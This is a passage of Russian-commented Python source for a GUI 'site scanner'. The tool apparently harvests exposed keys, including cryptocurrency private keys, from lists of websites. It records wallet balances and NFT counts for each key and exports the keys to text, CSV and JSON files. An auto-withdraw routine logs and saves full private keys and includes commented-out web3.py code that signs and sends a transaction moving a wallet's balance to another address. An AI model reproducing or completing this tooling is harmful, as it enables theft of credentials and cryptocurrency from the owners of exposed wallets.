                self.log(f"   От: {from_address}", "INFO")
                self.log(f"   Кому: {to_address}", "INFO")
                self.log(f"   Сумма: {balance:.8f} {currency}", "SUCCESS")
                self.log(f"   Приватный ключ: {private_key[:10]}...{private_key[-10:]}", "KEY")
                
                # Здесь была бы интеграция с web3.py для реального вывода:
                # from web3 import Web3
                # w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR-PROJECT-ID'))
                # transaction = {
                #     'to': to_address,
                #     'value': w3.toWei(balance - 0.001, 'ether'),  # -0.001 на gas
                #     'gas': 21000,
                #     'gasPrice': w3.eth.gas_price,
                #     'nonce': w3.eth.get_transaction_count(from_address),
                # }
                # signed = w3.eth.account.sign_transaction(transaction, private_key)
                # tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
                
                self.log(f"   ✅ Транзакция готова к отправке (реализуйте с web3.py)", "WARNING")
                
                # Сохраняем в файл
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                withdraw_file = os.path.join(self.results_folder, f'auto_withdraw_{timestamp}.txt')
                with open(withdraw_file, 'a', encoding='utf-8') as f:
                    f.write(f"="*60 + "\n")
                    f.write(f"ВРЕМЯ: {datetime.now()}\n")
                    f.write(f"От: {from_address}\n")
                    f.write(f"Кому: {to_address}\n")
                    f.write(f"Сумма: {balance:.8f} {currency}\n")
                    f.write(f"Приватный ключ: {private_key}\n")
                    f.write(f"="*60 + "\n\n")
                
                self.log(f"   💾 Информация сохранена: {withdraw_file}", "SUCCESS")
        
        except Exception as e:
            self.log(f"❌ Ошибка автовывода: {str(e)}", "ERROR")
    
    def analyze_results(self):
        """Анализ результатов сканирования"""
        self.is_scanning = False
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        
        successful = [r for r in self.results if r.get('status') == 'ok']
        failed = [r for r in self.results if r.get('status') != 'ok']
        with_keys = [r for r in self.results if r.get('keys')]
        
        total_keys = sum(len(r.get('keys', [])) for r in self.results)
        
        self.log("", "HEADER")
        self.log("📊 РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ", "HEADER")
        self.log("="*60, "HEADER")
        self.log(f"✅ Успешно: {len(successful)}/{len(self.sites)}", "SUCCESS")
        self.log(f"❌ Ошибок: {len(failed)}", "ERROR")
        self.log(f"🔑 Найдено ключей: {total_keys}", "KEY")
        self.log(f"📍 Сайтов с ключами: {len(with_keys)}", "KEY")
        
        if with_keys:
            self.log("", "HEADER")
            self.log("🔑 САЙТЫ С КЛЮЧАМИ:", "KEY")
            for r in with_keys:
                self.log(f"   {r['site']} - {len(r['keys'])} ключей", "KEY")
        
        self.update_stats()
        
        if with_keys:
            self.btn_save.config(state=tk.NORMAL)
            self.auto_save_results()
    
    def stop_scan(self):
        """Остановка сканирования"""
        self.is_scanning = False
        self.log("⏹️ СКАНИРОВАНИЕ ОСТАНОВЛЕНО", "WARNING")
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
    
    def save_results(self):
        """Сохранение результатов"""
        if not self.results:
            messagebox.showinfo("Инфо", "Нет результатов для сохранения")
            return
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        try:
            # Сохраняем все результаты
            all_file = os.path.join(self.results_folder, f'scan_results_{timestamp}.txt')
            with open(all_file, 'w', encoding='utf-8') as f:
                f.write("="*80 + "\n")
                f.write(f"РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ - {datetime.now()}\n")
                f.write("="*80 + "\n\n")
                
                for r in self.results:
                    f.write(f"Сайт: {r['site']}\n")
                    f.write(f"Статус: {r['status']}\n")
                    if 'http_status' in r:
                        f.write(f"HTTP: {r['http_status']}\n")
                    if 'time' in r:
                        f.write(f"Время: {r['time']:.2f} сек\n")
                    if r.get('keys'):
                        f.write(f"Найдено ключей: {len(r['keys'])}\n")
                        for key in r['keys']:
                            f.write(f"  🔑 {key}\n")
                    f.write("-"*40 + "\n\n")
            
            # Сохраняем только сайты с ключами
            with_keys = [r for r in self.results if r.get('keys')]
            if with_keys:
                keys_file = os.path.join(self.results_folder, f'keys_found_{timestamp}.txt')
                with open(keys_file, 'w', encoding='utf-8') as f:
                    f.write("="*80 + "\n")
                    f.write(f"САЙТЫ С НАЙДЕННЫМИ КЛЮЧАМИ - {datetime.now()}\n")
                    f.write("="*80 + "\n\n")
                    
                    for r in with_keys:
                        f.write(f"Сайт: {r['site']}\n")
                        f.write(f"Найдено ключей: {len(r['keys'])}\n")
                        for key in r['keys']:
                            f.write(f"  🔑 {key}\n")
                        f.write("-"*40 + "\n\n")
            
            self.log(f"💾 Результаты сохранены в {self.results_folder}", "SUCCESS")
            messagebox.showinfo("Успех", f"Результаты сохранены в:\n{self.results_folder}")
            
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось сохранить: {e}")
    
    def save_results_csv(self):
        """Сохранение результатов в CSV"""
        if not self.results:
            messagebox.showinfo("Инфо", "Нет результатов для сохранения")
            return
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        csv_file = os.path.join(self.results_folder, f'keys_export_{timestamp}.csv')
        
        try:
            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['Site', 'Key Type', 'Key Value', 'Balance', 'Currency', 'NFT Count'])
                
                for result in self.results:
                    if result.get('keys'):
                        site = result['site']
                        enriched = result.get('enriched_keys', result['keys'])
                        
                        for i, key in enumerate(result['keys']):
                            # Разделяем тип и значение
                            if ':' in key:
                                key_type, key_value = key.split(':', 1)
                                key_type = key_type.strip()
                                key_value = key_value.strip()
                            else:
                                key_type = 'Unknown'
                                key_value = key
                            
                            balance = ''
                            currency = ''
                            nft_count = ''
                            
                            # Добавляем данные о балансах/NFT если есть
                            if isinstance(enriched, list) and i < len(enriched):
                                if isinstance(enriched[i], dict):
                                    if enriched[i].get('balance'):
                                        balance = enriched[i]['balance']['balance']
                                        currency = enriched[i]['balance']['currency']
                                    if enriched[i].get('nfts'):
                                        nft_count = enriched[i]['nfts']['nft_count']
                            
                            writer.writerow([site, key_type, key_value, balance, currency, nft_count])
            
            self.log(f"📄 Экспорт CSV: {csv_file}", "SUCCESS")
            messagebox.showinfo("Успех", f"CSV сохранён:\n{csv_file}")
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось сохранить CSV: {e}")
    
    def save_results_json(self):
        """Сохранение результатов в JSON"""
        if not self.results:
            messagebox.showinfo("Инфо", "Нет результатов для сохранения")
            return
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        json_file = os.path.join(self.results_folder, f'keys_export_{timestamp}.json')
        
        try:
            # Формируем структурированные данные
            export_data = {
                'scan_date': datetime.now().isoformat(),
                'total_sites': len(self.sites),
                'successful_scans': len([r for r in self.results if r.get('status') == 'ok']),
                'total_keys_found': sum(len(r.get('keys', [])) for r in self.results),
                'results': []
            }
            
            for result in self.results:
                if result.get('keys'):
                    result_data = {
                        'site': result['site'],
                        'status': result['status'],
                        'http_status': result.get('http_status'),
                        'scan_time': result.get('time'),
                        'keys': []
                    }
                    
                    enriched = result.get('enriched_keys', result['keys'])
                    
                    for i, key in enumerate(result['keys']):
                        key_info = {'raw_key': key}
                        
                        if isinstance(enriched, list) and i < len(enriched) and isinstance(enriched[i], dict):
                            key_info['balance'] = enriched[i].get('balance')
                            key_info['nfts'] = enriched[i].get('nfts')
                        
                        result_data['keys'].append(key_info)
                    
                    export_data['results'].append(result_data)
            
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            
            self.log(f"📦 Экспорт JSON: {json_file}", "SUCCESS")
            messagebox.showinfo("Успех", f"JSON сохранён:\n{json_file}")
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось сохранить JSON: {e}")
    
    def auto_save_results(self):
        """Автосохранение результатов"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        with_keys = [r for r in self.results if r.get('keys')]
        if with_keys:
            auto_file = os.path.join(self.results_folder, f'auto_keys_{timestamp}.txt')
            with open(auto_file, 'w', encoding='utf-8') as f:
                f.write("="*80 + "\n")
                f.write(f"АВТОМАТИЧЕСКОЕ СОХРАНЕНИЕ - {datetime.now()}\n")
                f.write("="*80 + "\n\n")
                
                for r in with_keys:
                    f.write(f"🌐 {r['site']}\n")
                    for key in r['keys']:
                        f.write(f"   🔑 {key}\n")
                    f.write("-"*40 + "\n\n")
            
            self.log(f"💾 Автосохранение: {auto_file}", "SUCCESS")
    
    def clear_all(self):
        """Очистка всего"""
        if messagebox.askyesno("Подтверждение", "Очистить все данные?"):
            self.sites_text.delete(1.0, tk.END)
            self.log_text.delete(1.0, tk.END)
            self.results = []
            self.stats_text.delete(1.0, tk.END)
            self.log("🧹 Все данные очищены", "INFO")


def main():
    root = tk.Tk()
    app = SiteScannerGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()